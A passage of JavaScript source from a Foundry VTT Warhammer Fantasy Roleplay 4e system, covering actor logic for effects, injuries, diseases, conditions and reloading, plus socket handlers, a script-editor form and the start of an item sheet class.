   */
  getScriptsApplyingToItem(item) {
    return this.getEffectsApplyingToItem(item).reduce((prev, current) => prev.concat(current.scripts), []);
  }


  /**
 * 
 * @param {Boolean} includeItemEffects Include Effects that are intended to be applied to Items, see getScriptsApplyingToItem, this does NOT mean effects that come from items
 */
  *allApplicableEffects(includeItemEffects = false) {

    for (const effect of this.effects) {
      if (effect.applicationData.documentType == "Item" && includeItemEffects) // Some effects are intended to modify items, but are placed on the actor for ease of tracking
      {
        yield effect;
      }
      else if (effect.applicationData.documentType == "Actor") // Normal effects (default documentType is actor)
      {
        yield effect;
      }
    }
    for (const item of this.items) {
      for (const effect of item.effects.contents.concat(item.system.getOtherEffects())) {
        // So I was relying on effect.transfer, which is computed in the effect's prepareData
        // However, apparently when you first load the world, that is computed after the actor
        // On subsequent data updates, it's computed before. I don't know if this is intentional
        // Regardless, we need to doublecheck whether this effect should transfer to the actor
        if (effect.determineTransfer()) {
          yield effect;
        }
      }
    }
    if (this.system.vehicle)
    {
      for(let effect of this.system.vehicle.system.crewEffects)
      {
        yield effect;
      }    
    }
    else if (this.type == "vehicle") // Probably move this to model? getOtherEffects for Actors?
    {
      for(let effect of this.system.status.morale.getMoraleEffects(this))
      {
        yield effect;
      }
    }
  }

  /**
   * Decrements all injuries of this Actor
   *
   * @return {Promise<void>}
   */
  async decrementInjuries() {
    for (let i of this.injuries)
      await this.decrementInjury(i);
  }

  /**
   * Decrements a `duration` value for the Injury.
   * If `duration` reaches 0, inform about Injury being finished.
   *
   * @param {ItemWfrp4e}injury
   *
   * @return {Promise<*>}
   */
  async decrementInjury(injury) {
    if (isNaN(injury.system.duration.value))
      return ui.notifications.notify(game.i18n.format("CHAT.InjuryError", { injury: injury.name }))

    injury = foundry.utils.deepClone(injury);
    injury.system.duration.value--;

    if (injury.system.duration.value <= 0) {
      injury.system.duration.value = 0;
      let chatData = game.wfrp4e.utility.chatDataSetup(game.i18n.format("CHAT.InjuryFinish", { injury: injury.name }), "gmroll");
      chatData.speaker = { alias: this.name };
      ChatMessage.create(chatData);
    }

    await this.updateEmbeddedDocuments("Item", [injury]);
  }

  /**
   * Decrements all diseases of this Actor
   *
   * @return {Promise<void>}
   */
  async decrementDiseases() {
    const updates = [];

    for (let d of this.diseases)
      updates.push(await this.decrementDisease(d, false));

    await this.updateEmbeddedDocuments("Item", updates.filter(u => u !== null));
  }

  /**
   * Decrements a value for Disease's `incubation` or `duration` attribute, depending on whether it is active or not.
   * If value reaches 0, activates (if `incubation`), or finishes (if `duration`) the Disease.
   *
   * @param {ItemWfrp4e} disease  - disease Document to decrement and process
   * @param {boolean}    save     - whether disease should be updated here
   *
   * @return {Promise<ItemWfrp4e|null>}
   */
  async decrementDisease(disease, save = true) {
    let d = foundry.utils.deepClone(disease);
    let type = d.system.duration.active ? 'duration' : 'incubation';

    if (Number.isNumeric(d.system[type].value)) {
      d.system[type].value--;

      if (d.system[type].value <= 0) {
        d.system[type].value = 0;

        if (type === 'incubation')
          d = await this.activateDisease(d);

        if (type === 'duration')
          d = await this.finishDisease(d);
      }
    } else {
      let chatData = game.wfrp4e.utility.chatDataSetup(`Attempted to decrement ${d.name} ${type} but value is non-numeric`, "gmroll", false);
      chatData.speaker = {alias: this.name};
      ChatMessage.create(chatData);
    }

    if (d && save)
      await this.updateEmbeddedDocuments("Item", [d]);

    return d;
  }

  /**
   *
   * @param {ItemWfrp4e} disease
   *
   * @return {Promise<void>}
   */
  async activateDisease(disease) {
    disease.system.duration.active = true;
    disease.system.incubation.value = 0;
    let msg = game.i18n.format("CHAT.DiseaseIncubation", { disease: disease.name });

    try {
      let durationRoll = (await new Roll(disease.system.duration.value).roll()).total;
      msg += game.i18n.format("CHAT.DiseaseDuration", { duration: durationRoll, unit: disease.system.duration.unit });
      disease.system.duration.value = durationRoll;
    } catch (e) {
      msg += game.i18n.localize("CHAT.DiseaseDurationError");
    }

    let chatData = game.wfrp4e.utility.chatDataSetup(msg, "gmroll", false);
    chatData.speaker = { alias: this.name };
    ChatMessage.create(chatData);

    return disease;
  }

  /**
   * Finishes disease and handles Lingering symptoms.
   *
   * @param {ItemWfrp4e} disease
   *
   * @return {Promise<ItemWfrp4e|null>}
   */
  async finishDisease(disease) {
    let msg = game.i18n.format("CHAT.DiseaseFinish", { disease: disease.name });
    let removeDisease = true;
    const symptoms = disease.system.symptoms.value.toLowerCase();

    if (symptoms.includes(game.i18n.localize("NAME.Lingering").toLowerCase())) {
      let lingering = disease.effects.find(e => e.name.includes(game.i18n.localize("WFRP4E.Symptom.Lingering")));
      if (lingering) {
        let difficultyname = lingering.name.substring(lingering.name.indexOf("(") + 1, lingering.name.indexOf(")")).toLowerCase();
        let difficulty = game.wfrp4e.utility.findKey(difficultyname, game.wfrp4e.config.difficultyNames, { caseInsensitive: true }) || "challenging";
	  
        let test = await this.setupSkill(game.i18n.localize("NAME.Endurance"), {appendTitle: ` - ${game.i18n.localize("NAME.Lingering")}`, fields: {difficulty : difficulty} }, {skipTargets: true});
        await test.roll();

        if (test.failed) {
          let negSL = Math.abs(test.result.SL);
          let lingeringDisease;

          if (negSL <= 1) {
            let roll = (await new Roll("1d10").roll()).total;
            msg += "<br>" + game.i18n.format("CHAT.LingeringExtended", { roll });
            removeDisease = false;
            disease.system.duration.value = roll;
          } else if (negSL <= 5) {
            msg += "<br>" + game.i18n.localize("CHAT.LingeringFestering");
            lingeringDisease = await fromUuid("Compendium.wfrp4e-core.items.kKccDTGzWzSXCBOb");
          } else if (negSL >= 6) {
            msg += "<br>" + game.i18n.localize("CHAT.LingeringRot");
            lingeringDisease = await fromUuid("Compendium.wfrp4e-core.items.M8XyRs9DN12XsFTQ");
          }

          if (lingeringDisease) {
            lingeringDisease = lingeringDisease.toObject();
            lingeringDisease.system.incubation.value = 0;
            lingeringDisease.system.duration.active = true;

            await this.createEmbeddedDocuments("Item", [lingeringDisease]);
          }
        }
      }
    }

    let chatData = game.wfrp4e.utility.chatDataSetup(msg, "gmroll", false);
    chatData.speaker = { alias: this.name };
    ChatMessage.create(chatData);

    if (removeDisease) {
      await this.deleteEmbeddedDocuments("Item", [disease._id]);

      return null;
    }

    return disease;
  }

  /**
   * Checks the status of reloading the provided weapon. If weapon is empty, create an extended test, if test is complete, deleted extended test and load weapon
   * 
   * 
   * @param {Item} weapon - Weapon whose reload status is being checked
   * @param {Actor} actor - Actor whose skills to use (pertinent for vehicles)
   * @returns 
   */
  async checkReloadExtendedTest(weapon, actor) {

    if (!weapon.loading)
      return

    actor = actor || this.actor;

    let reloadingTest = weapon.actor.items.get(weapon.getFlag("wfrp4e", "reloading"));

    if (weapon.loaded.amt > 0) {
      if (reloadingTest) {
        await reloadingTest.delete();
        await weapon.update({ "flags.wfrp4e.-=reloading": null });
        ui.notifications.notify(game.i18n.localize("ITEM.ReloadFinish"));
        return;
      }
    }
    else {
      let reloadExtendedTest = foundry.utils.duplicate(game.wfrp4e.config.systemItems.reload);

      reloadExtendedTest.name = game.i18n.format("ITEM.ReloadingWeapon", { weapon: weapon.name });
      if (weapon.system.getSkillToUse(actor))
        reloadExtendedTest.system.test.value = weapon.system.getSkillToUse(actor).name;
      else
        reloadExtendedTest.system.test.value = game.i18n.localize("CHAR.BS");
      reloadExtendedTest.flags.wfrp4e.reloading = weapon.id;

      reloadExtendedTest.system.SL.target = weapon.properties.flaws.reload?.value || 1;

      if (weapon.actor.type == "vehicle") {
        let vehicleSpeaker;
        if (weapon.actor.isToken)
          vehicleSpeaker = {
            token: weapon.actor.token.id,
            scene: weapon.actor.token.parent.id
          };
        else
          vehicleSpeaker = {
            actor: weapon.actor.id
          };
        reloadExtendedTest.flags.wfrp4e.vehicle = vehicleSpeaker;
      }

      if (reloadingTest)
        await reloadingTest.delete();

      // use weapon.actor in case the weapon is owned by a vehicle
      let item = await weapon.actor.createEmbeddedDocuments("Item", [reloadExtendedTest]);
      ui.notifications.notify(game.i18n.format("ITEM.CreateReloadTest", { weapon: weapon.name }));
      await weapon.update({ "flags.wfrp4e.reloading": item[0].id });
    }
  }


  setAdvantage(val) {
    return this.update({ "system.status.advantage.value": val })
  }
  modifyAdvantage(val) {
    return this.setAdvantage(this.status.advantage.value + val)
  }

  setWounds(val) {
    return this.update({ "system.status.wounds.value": val })
  }
  modifyWounds(val) {
    return this.setWounds(this.status.wounds.value + val)
  }


  showCharging(item) {
    if (item.attackType == "melee")
      return true
  }

  get isMounted() {
    return this.system.isMounted
  }

  get mount() {
    return this.system.mount;

  }

  showDualWielding(weapon) {
    if (!weapon.offhand.value && this.has(game.i18n.localize("NAME.DualWielder"), "talent")) {
      return !this.noOffhand
    }
    return false;
  }


  async addCondition(effect, value = 1, mergeData={}) {
    if (value == 0)
    {
      return;
    }
    if (typeof value == "string")
    {
      value = parseInt(value);
    }

    if (typeof (effect) === "string")
      effect = foundry.utils.duplicate(game.wfrp4e.config.statusEffects.find(e => e.id == effect));
    if (!effect)
      return "No Effect Found"

    if (!effect.id)
      return "Conditions require an id field"


    let existing = this.hasCondition(effect.id);

    if (existing && !existing.isNumberedCondition)
      return existing
    else if (existing) {
      existing._displayScrollingStatus(true);
      return existing.setFlag("wfrp4e", "value", existing.conditionValue + value)
    }
    else if (!existing) {
      if (game.combat && (effect.id == "blinded" || effect.id == "deafened"))
        effect.flags.wfrp4e.roundReceived = game.combat.round;
      effect.name = game.i18n.localize(effect.name);

      if (Number.isNumeric(effect.flags.wfrp4e.value))
        effect.flags.wfrp4e.value = value;
        
      effect["statuses"] = [effect.id];
      if (effect.id == "dead")
        effect["flags.core.overlay"] = true;
      if (effect.id == "unconscious")
        await this.addCondition("prone");

      foundry.utils.mergeObject(effect, mergeData, {overwrite: false});

      delete effect.id;
      return this.createEmbeddedDocuments("ActiveEffect", [effect], {condition: true})
    }
  }

  async removeCondition(effect, value = 1) {
    if (typeof (effect) === "string")
      effect = foundry.utils.duplicate(game.wfrp4e.config.statusEffects.find(e => e.id == effect));
    if (!effect)
      return "No Effect Found"

    if (!effect.id)
      return "Conditions require an id field"

    if (value == 0)
    {
      return;
    }
    if (typeof value == "string")
    {
      value = parseInt(value);
    }

    let existing = this.hasCondition(effect.id);

    if (existing && !existing.isNumberedCondition) {
      if (effect.id == "unconscious")
        await this.addCondition("fatigued");
      return existing.delete();
    }
    else if (existing) {
      await existing.setFlag("wfrp4e", "value", existing.conditionValue - value);
      if (existing.conditionValue) // Only display if there's still a condition value (if it's 0, already handled by effect deletion)
        existing._displayScrollingStatus(false);
      //                                                                                                                   Only add fatigued after stunned if not already fatigued
      if (existing.conditionValue == 0 && (effect.id == "bleeding" || effect.id == "poisoned" || effect.id == "broken" || (effect.id == "stunned" && !this.hasCondition("fatigued")))) {
        if (!game.settings.get("wfrp4e", "mooConditions") || !effect.id == "broken") // Homebrew rule prevents broken from causing fatigue
          await this.addCondition("fatigued");
      }

      if (existing.conditionValue <= 0)
        return existing.delete();
    }
  }

  applyFear(value, name = undefined) {
    value = value || 0;
    let fear = foundry.utils.duplicate(game.wfrp4e.config.systemItems.fear);
    fear.system.SL.target = value;

    foundry.utils.setProperty(fear, "flags.wfrp4e.fearName", name);

    return this.createEmbeddedDocuments("Item", [fear], {condition: true}).then(items => {
      this.setupExtendedTest(items[0], {appendTitle : ` - ${items[0].name}`});
    });
  }


  async applyTerror(value, name = undefined) {
    value = value || 1;
    let terror = foundry.utils.duplicate(game.wfrp4e.config.systemItems.terror);
    terror.flags.wfrp4e.terrorValue = value;
    let scripts = new EffectWfrp4e(terror, {parent: this}).scripts;
    for (let s of scripts) {
      await s.execute({ actor: this });
    }
  }

  awardExp(amount, reason, message=null) {
    let experience = foundry.utils.duplicate(this.details.experience);
    experience.total += amount;
    experience.log.push({ reason, amount, spent: experience.spent, total: experience.total, type: "total" });
    this.update({ "system.details.experience": experience }, {fromMessage : message});
    ChatMessage.create({ content: game.i18n.format("CHAT.ExpReceived", { amount, reason }), speaker: { alias: this.name } });
  }

  _addToExpLog(amount, reason, newSpent, newTotal) {
    if (!newSpent)
      newSpent = this.details.experience.spent;
    if (!newTotal)
      newTotal = this.details.experience.total;

    let expLog = foundry.utils.duplicate(this.details.experience.log || []);
    expLog.push({ amount, reason, spent: newSpent, total: newTotal, type: newSpent ? "spent" : "total" });
    return expLog
  }


  async checkSystemEffects() {
    if (game.user.id != WFRP_Utility.getActiveDocumentOwner(this)?.id)
    {
      return
    }
    let encumbrance = this.status.encumbrance.state;
    let state;

    if (encumbrance > 3) {
      state = "enc3";
      if (!this.hasSystemEffect(state)) {
        await this.addSystemEffect(state);
        return
      }
      await this.removeSystemEffect("enc2");
      await this.removeSystemEffect("enc1");
    }
    else if (encumbrance > 2) {
      state = "enc2";
      if (!this.hasSystemEffect(state)) {
        await this.addSystemEffect(state);
        return
      }
      await this.removeSystemEffect("enc1");
      await this.removeSystemEffect("enc3");
    }
    else if (encumbrance > 1) {
      state = "enc1";
      if (!this.hasSystemEffect(state)) {
        await this.addSystemEffect(state);
        return
      }
      await this.removeSystemEffect("enc2");
      await this.removeSystemEffect("enc3");
    }
    else {
      await this.removeSystemEffect("enc1");
      await this.removeSystemEffect("enc2");
      await this.removeSystemEffect("enc3");
    }

  }


  async addSystemEffect(key) {
    let systemEffects = game.wfrp4e.utility.getSystemEffects(this.type == "vehicle");
    let effect = systemEffects[key];
    if (effect) {
      await this.createEmbeddedDocuments("ActiveEffect", [effect]);
    }
  }

  async removeSystemEffect(key) {
    let effects = this.effects.filter(e => e.statuses.has(key));
    if (effects.length)
      await this.deleteEmbeddedDocuments("ActiveEffect", effects.map(i => i.id));
  }

  hasSystemEffect(key) {
    return this.hasCondition(key) // Same function so just reuse
  }


  /**
   * Creates a chat message with current conditions and penalties to an actor.
   * 
   * @param {String} tokenId  Token id to retrieve token from canvas
   * @param {Object} round    Round object to display round number
   */
  displayStatus(round = undefined, nameOverride) {
    if (round)
      round = game.i18n.format("CondRound", { round: round });

    let displayConditions = this.effects.map(e => {
      if (e.conditionKey && ! e.disabled) {
        return e.name + " " + (e.conditionValue || "")
      }
    }).filter(i => !!i);

    // Aggregate conditions to be easily displayed (bleeding4 and bleeding1 turns into Bleeding 5)

    let chatOptions = {
      rollMode: game.settings.get("core", "rollMode")
    };
    if (["gmroll", "blindroll"].includes(chatOptions.rollMode)) chatOptions["whisper"] = ChatMessage.getWhisperRecipients("GM").map(u => u.id);
    if (chatOptions.rollMode === "blindroll") chatOptions["blind"] = true;
    chatOptions["template"] = "systems/wfrp4e/templates/chat/combat-status.hbs";

    let chatData = {
      name: nameOverride || (this.token ? this.token.name : this.prototypeToken.name),
      conditions: displayConditions,
      modifiers: this.flags.modifier,
      round: round
    };


    return renderTemplate(chatOptions.template, chatData).then(html => {
      chatOptions["user"] = game.user.id;

      // Emit the HTML as a chat message
      chatOptions["content"] = html;
      chatOptions["type"] = 0;
      ChatMessage.create(chatOptions, false);
      return html;
    });
  }

  renderTokenAuras()
  {
    this.getActiveTokens().forEach(t => t.renderAuras());
  }

  /**
   * Returns items for new actors: money and skills
   */
  async _getNewActorItems() {

    let basicSkills = await WFRP_Utility.allBasicSkills() || [];
    let moneyItems = ((await WFRP_Utility.allMoneyItems()) || [])
      .map(m => { // Set money items to descending in value and set quantity to 0
        m.system.quantity.value= 0;
        return m;
      })
      .sort((a, b) => (a.system.coinValue.value >= b.system.coinValue.value) ? -1 : 1)
      || [];

    // If character, automatically add basic skills and money items
    if (this.type == "character")
      return basicSkills.concat(moneyItems)

    // If not a character, ask the user whether they want to add basic skills / money
    else if (this.type == "npc" || this.type == "creature") {
      return new Promise(resolve => {
        new Dialog({
          title: game.i18n.localize("ACTOR.BasicSkillsTitle"),
          content: `<p>${game.i18n.localize("ACTOR.BasicSkillsPrompt")}</p>`,
          buttons: {
            yes: {
              label: game.i18n.localize("Yes"),
              callback: async dlg => {
                resolve(basicSkills.concat(moneyItems));
              }
            },
            no: {
              label: game.i18n.localize("No"),
              callback: async dlg => {
                resolve([]);
              }
            },
          },
          default: 'yes'
        }).render(true);
      })
    }
    else return []
  }

  /**@deprecated in favor of just calling itemTypes */
  getItemTypes(type) {
    return this.itemTypes[type]
  }

  _itemTypes = null;

  get itemTypes()
  {
    if (!this._itemTypes)
    {
      this._itemTypes = super.itemTypes;
    }
    return this._itemTypes
  }

  async clearOpposed() {
    return (await this.update({ "flags.-=oppose": null }));
  }

  sameSideAs(actor)
  {
      let self = this.getActiveTokens()[0]?.document?.toObject() || this.prototypeToken;
      let target = actor.getActiveTokens()[0]?.document?.toObject() || actor.prototypeToken;
      if (this.hasPlayerOwner && actor.hasPlayerOwner) // If both are owned by players, probably the same side
      {
          return true;
      }
      else if (this.hasPlayerOwner) // If this actor is owned by a player, and the other is friendly, probably the same side
      {
          return target.disposition == CONST.TOKEN_DISPOSITIONS.FRIENDLY; 
      }
      else if (actor.hasPlayerOwner) // If this actor is friendly, and the other is owned by a player, probably the same side
      {
          return self.disposition == CONST.TOKEN_DISPOSITIONS.FRIENDLY;
      }
      else // If neither are owned by a player, only same side if they have the same disposition
      {
          return self.disposition == target.disposition;
      }
  }

  // @@@@@@@@ BOOLEAN GETTERS

  get inCollection() {
    return game.actors && game.actors.get(this.id)
  }

  get hasSpells() {
    return !!this.itemTypes["spell"].length > 0
  }

  get hasPrayers() {
    return !!this.itemTypes["prayer"].length > 0
  }

  get noOffhand() {
    return !this.itemTypes["weapon"].find(i => i.offhand.value)
  }

  get isOpposing() {
    return !!this.flags.oppose
  }

  get currentAreaEffects() 
  {
      return this.effects.contents.filter(e => e.getFlag("wfrp4e", "fromArea"));
  }

  get currentAreas()
  {
      let token = this.getActiveTokens()[0];
      return canvas.templates.placeables.filter(t => AreaHelpers.isInTemplate(token.center, t));
  }

  get auras() 
  {
    return this.items.filter(i => i.included).reduce((acc, item) => acc.concat(item.effects.contents), []).concat(this.effects.contents).filter(e => e.applicationData.type == "aura" && !e.applicationData.targetedAura)
  }

  /**
   * Overriden from foundry to pass true to allApplicableEffects
   */
  get temporaryEffects() 
  {
      const effects = [];
      for ( const effect of this.allApplicableEffects(true) ) 
      {
          if ( effect.active && effect.isTemporary ) {effects.push(effect);}
      }
      return effects;
  }

  get mainArmLoc() 
  {
    return (this.system.details.mainHand || "r") + "Arm"
  }

  get secondaryArmLoc() 
  {
    return (this.system.details.mainHand == "r" ? "l" : "r") + "Arm"
  }

  /**
   * When a test is rolled, it may roll "rArm" or "lArm" 
   * However, a test doesn't necessarily know who it's attacking, so this
   * actually means "primary" and "secondary" arm respectively.
   * 
   * This function makes the conversion. If a character's main arm is their left, and a test
   * rolled "rArm" as the hit location, that actually means they hit the left arm, as "rArm" means
   * main arm, and their main arm is left
   * 
   * @param {string} hitloc "rArm" or "lArm"
   */
  convertHitLoc(hitloc)
  {
    if (hitloc == "rArm")
    {
      return this.mainArmLoc
    }
    else if (hitloc == "lArm")
    {
      return this.secondaryArmLoc;
    }
    return hitloc
  }



  speakerData(token) {
    if (this.isToken || token) {
      return {
        token: token?.id || this.token.id,
        scene: token?.parent.id || this.token.parent.id
      }
    }
    else {
      return {
        actor: this.id,
        token: token?.id,
        scene: token?.parent.id
      }
    }
  }

  // @@@@@@@@@@@ COMPUTED GETTERS @@@@@@@@@
  get Species() {
    let species = game.wfrp4e.config.species[this.details.species.value] || this.details.species.value;
    if (this.details.species.subspecies && game.wfrp4e.config.subspecies[this.details.species.value] && game.wfrp4e.config.subspecies[this.details.species.value][this.details.species.subspecies])
      species += ` (${game.wfrp4e.config.subspecies[this.details.species.value][this.details.species.subspecies].name})`;
    else if (this.details.species.subspecies)
      species += ` (${this.details.species.subspecies})`;

    return species
  }

  get sizeNum() {
    return game.wfrp4e.config.actorSizeNums[this.details.size.value]
  }

  get equipPointsUsed() {
    return this.itemTypes["weapon"].reduce((prev, current) => {
      if (current.isEquipped)
        prev += current.twohanded.value ? 2 : 1;
      return prev
    }, 0)
  }

  get equipPointsAvailable() {
    return Number.isNumeric(this.flags.equipPoints) ? this.flags.equipPoints : 2
  }

  get defensive() {

    // Add defensive traits and weapons together
    return this.itemTypes["weapon"].reduce((prev, current) => {
      if (current.isEquipped)
        prev += current.properties.qualities.defensive ? 1 : 0;
      return prev
    }, 0) + this.itemTypes["trait"].reduce((prev, current) => {
      if (current.included)
        prev += current.properties?.qualities?.defensive ? 1 : 0;
      return prev
    }, 0)
  }

  get currentCareer() {
    return this.system.currentCareer
  }

  get attacker() {
    try {
      if (this.flags.oppose) {
        let opposeMessage = game.messages.get(this.flags.oppose.opposeMessageId); // Retrieve attacker's test result message
        let oppose = opposeMessage.getOppose();
        let attackerMessage = oppose.attackerMessage;
        // Organize attacker/defender data
        if (opposeMessage)
          return {
            speaker: attackerMessage.speaker,
            test: attackerMessage.getTest(),
            messageId: attackerMessage.id,
            img: WFRP_Utility.getSpeaker(attackerMessage.speaker).img
          };
        else
          this.update({ "flags.-=oppose": null });
      }
    }
    catch (e) {
      console.error("Error finding attacker, removing flags." + e);
      this.update({ "flags.-=oppose": null });
    }

  }


  // Used with Group Advantage
  // Actor is considered in the "Players" group if it is owned by a player or has a Friendly token disposition
  // Otherwise, it is considered in the "Enemies" group
  get advantageGroup() {
    if (this.hasPlayerOwner)
      return "players"
    else if (this.token)
      return this.token.disposition == CONST.TOKEN_DISPOSITIONS.FRIENDLY ? "players" : "enemies"
    else 
      return this.prototypeToken.disposition == CONST.TOKEN_DISPOSITIONS.FRIENDLY ? "players" : "enemies"
  }

  // @@@@@@@@@@@ DATA GETTERS @@@@@@@@@@@@@
  get characteristics() { return this.system.characteristics }
  get status() { return this.system.status }
  get details() { return this.system.details }
  get excludedTraits() { return this.system.excludedTraits }
  get roles() { return this.system.roles }

  // @@@@@@@@@@ DERIVED DATA GETTERS
  get armour() { return this.status.armour }
}

class SocketHandlers  {

    static call(type, payload, userId)
    {
        if (userId == "GM") {
            if (!game.users.activeGM)
            {
                throw new Error("No Active GM present");
            }
            userId = game.users.activeGM.id;
        }
        game.socket.emit("system.wfrp4e", {type, payload, userId});
    }

    static register()
    {
        game.socket.on("system.wfrp4e", async data => 
        {
            if (!data.userId) {
                WFRP_Utility.log("userId is missing in socket request, fallback to ALL"); 
                data.userId = "ALL";
            }
            if (data.userId != game.user.id && data.userId != "ALL") return;

            let result = await this[data.type]({...data.payload}, data.userId);
            if (!data.payload.socketMessageId) return;

            if (!result) {
                SocketHandlers.deleteMsg({id: data.payload.socketMessageId});
            } else {
                data.payload.socketResult = result;
                SocketHandlers.updateSocketMessageResult(data.payload);
            }
        });
    }

    static updateSocketMessageResult(payload) {
        let message = game.messages.get(payload.socketMessageId);
        if (message && payload.socketResult) {
            message.setFlag("wfrp4e", "socketResult", payload.socketResult);
        }
    }

    static morrslieb(payload){
        canvas.draw();
    }

    static async target(payload){
        let scene = game.scenes.get(payload.scene);
        let token = scene.tokens.get(payload.target);
        await token.actor.update({ "flags.oppose": payload.opposeFlag });
    }

    static async updateMsg(payload)
    {
        if (game.user.isUniqueGM)
        {
            const msg = game.messages.get(payload.id);
            await msg.update(payload.updateData);
            return "success"
        }
    }

    static async deleteMsg(payload) {
        const msg = game.messages.get(payload.id);
        if (msg) {
            await msg.delete();
        }
    }

    static async applyEffect({effectUuids, effectData, actorUuid, messageId}) {
        let result = await fromUuidSync(actorUuid)?.applyEffect({effectUuids, effectData, messageId});
        return result;
    }

    static async applyDamage({damage, options, actorUuid}) {
        let result = await fromUuidSync(actorUuid)?.applyBasicDamage(damage, options);
        return result;
    }

    static async changeGroupAdvantage(payload) {
        if (game.user.isUniqueGM)
        {
            let advantage = game.settings.get("wfrp4e", "groupAdvantageValues");
            advantage.players = payload.players;        
            await game.settings.set("wfrp4e", "groupAdvantageValues", advantage);
        }
    }

    static async createActor(payload) {
        let id = payload.id;
        let actorData = payload.data;

        // Give ownership to requesting actor
        actorData.ownership = {
            default: 0,
            [id] : 3
        };
        let actor = await Actor.implementation.create(actorData);
        return actor.id;        
    }

    /**
     * Not used by sockets directly, but is called when a socket handler should be executed by
     * the specific user which owns a document. Usually used to invoke tests from other users
     * for their assigned Actor. 
     * 
     * @param {Document} document Document on which to test if the user is owner or not
     * @param {String} type Type of socket handler
     * @param {Object} payload Data for socket handler, should generally include document UUID 
     * @returns 
     */
    static executeOnOwner(document, type, payload) {
        let ownerUser = game.wfrp4e.utility.getActiveDocumentOwner(document);
        if (game.user.id == ownerUser.id) {
            this[type](payload);
        } else {
            WFRP_Utility.log(game.i18n.format("SOCKET.SendingSocketRequest", { name: ownerUser.name }));
            SocketHandlers.call(type, payload, ownerUser.id);
        }
    }

    static async executeOnUserAndWait(userId, type, payload) {
        let result;
        if (game.user.id == userId || (userId == "GM" && game.user.isGM)) {
            result = await this[type](payload);
        } else {
            WFRP_Utility.log(game.i18n.format("SOCKET.SendingSocketRequest", { name: userId }));
            let owner = game.users.get(userId) ?? game.users.activeGM;
            let msg = await SocketHandlers.createSocketRequestMessage(owner, "Sending socket message to " + owner?.name + "...");
            payload.socketMessageId = msg.id;
            SocketHandlers.call(type, payload, userId);
            do {
                await game.wfrp4e.utility.sleep(250);
                msg = game.messages.get(msg.id);
                result = msg?.getFlag("wfrp4e", "socketResult");
            } while (msg && !result);
            if (msg && game.user.isGM) {
                msg.delete();
            } else if (msg && !game.user.isGM) {
                SocketHandlers.call("deleteMsg", { "id": msg.id }, "GM");
            }
        }
        return result;
    }

    static async executeOnOwnerAndWait(document, type, payload) {
        let ownerUser = game.wfrp4e.utility.getActiveDocumentOwner(document);
        return await SocketHandlers.executeOnUserAndWait(ownerUser.id, type, payload);
    }


    static async createSocketRequestMessage(owner, content) {
        let chatData = {
          content: `<p class='requestmessage'><b><u>${owner?.name}</u></b>: ${content}</p?`,
          whisper: ChatMessage.getWhisperRecipients("GM")
        };
        if (game.user.isGM) {
          chatData.user = owner;
        }
        let msg = await ChatMessage.create(chatData);
        return msg;
    }
}

class ScriptConfig extends FormApplication
{
    static get defaultOptions() 
    {
        const options = super.defaultOptions;
        options.classes = options.classes.concat(["wfrp4e", "script-config"]);
        options.title = game.i18n.localize("SCRIPT.Config");
        options.resizable = true;
        options.width = 650;
        options.height = 500;
        options.template = "systems/wfrp4e/templates/apps/script-config.hbs";
        return options;
    }

    constructor(...args)
    {
        super(...args);
    }

    async getData() 
    {
        let data = await super.getData();
        this.aceActive = game.modules.get("acelib")?.active;
        data.aceActive = this.aceActive;
        data.script = this._getScript();
        return data;
    }


    _getScript()
    {
        return foundry.utils.getProperty(this.object, this.options.path);
    }

    _updateObject(ev, formData)
    {
        let script = this.aceActive ? this.editor.getValue() : formData.script; 
        return this.object.update({[this.options.path] : script});
    }

    _getAceEditorContents()
    {
        return this._getScript() || "";
    }

    activateListeners(html)
    {
        super.activateListeners(html);

        if (this.aceActive)
        {
            this.editor = ace.edit(html.find(".ace-editor")[0]);
            this.editor.setValue(this._getAceEditorContents());
            this.editor.setOptions(foundry.utils.mergeObject(ace.userSettings, {
                theme : "ace/theme/solarized_dark",
                keyboardHandler : "ace/mode/vscode",
                printMargin : 0,
                maxLines: 999999,
                indentedSoftWrap: false,
                esVersion: 13,
            }));
            this.editor.session.on('changeMode', function(e, session){
                if ("ace/mode/javascript" === session.getMode().$id) {
                    if (!!session.$worker) {
                        session.$worker.send("setOptions", [{
                            "esversion": 13
                        }]);
                    }
                }
            });
            this.editor.session.setMode("ace/mode/javascript");
            this.editor.session.setUseWrapMode(false);
            this.editor.setAutoScrollEditorIntoView(true);
            this.editor.clearSelection();
        }

        // Prevent tab from changing focus, instead add a tab to the textarea
        html.find("textarea.no-ace").keydown(ev => 
        {
            if (ev.key == "Tab")
            {
                ev.preventDefault();
                let target = ev.target;
                var start = target.selectionStart;
                var end = target.selectionEnd;

                target.value = target.value.substring(0, start) + "\t" + target.value.substring(end);

                target.selectionStart = target.selectionEnd = start + 1;
            }
        });
    }

    setPosition({left, top, width, height, scale} = {}) {
        if (this.aceActive)
            this.editor.resize();

        return super.setPosition({left, top, width, height, scale});
    }
}

/**
 * Provides the data and general interaction with Item Sheets
 *
 * The main purpose of this sheet class is to provide the correct
 * data to the template when rendering depending on what type
 * of item the sheet belongs too. Additionally, item sheet
 * interactivity and events are handled here.
 */



class ItemSheetWfrp4e extends WFRP4eSheetMixin$1(ItemSheet) 
{
  classes = ['item-sheet'];

  constructor(item, options) {
    super(item, options);
    this.mce = null;

    this.options.classes.push(...this.sheetClasses);
  }

  get sheetClasses() {
    let classes = this.classes;

    switch (this.item?.type) {
      case 'armour':
        classes.push('equipment-sheet');
        break;
      case 'ammunition':
        classes.push('ammo-sheet');
        break;
      case 'cargo':
      case 'trapping':
      case 'vehicleMod':
        classes.push('trapping-sheet');
        break;
      case 'critical':
      case 'extendedTest':
      case 'injury':
        classes.push('injury-sheet');
        break;
      case 'career':
      case 'container':
      case 'disease':
      case 'money':
      case 'mutation':
      case 'prayer':
      case 'psychology':
      case 'skill':
      case 'spell':
      case 'talent':
      case 'trait':
      case 'weapon':
      default:
        classes.push(`${this.item?.type}-sheet`);
        break;
    }

    return classes;
  }

  static get defaultOptions() {
    const options = super.defaultOptions;
    options.tabs = [{ navSelector: ".tabs", contentSelector: ".content", initial: "description" }];
    options.dragDrop = [{dragSelector: ".effect-list .effect", dropSelector: "form"}],
    options.scrollY = [".details"];
    return options;
  }


  /**
   * Override header buttons to add custom ones.
   */
  _getHeaderButtons() {
    let buttons = super._getHeaderButtons();
    // Add "Post to chat" button
    // We previously restricted this to GM and editable items only. If you ever find this comment because it broke something: eh, sorry!
    buttons.unshift(
      {
        class: "post",
        icon: "fas fa-comment",
        onclick: ev => this.item.postItem()
      });
    return buttons
  }

  // Add tooltips to header buttons
  async _render(force = false, options = {}) {
    await super._render(force, options);
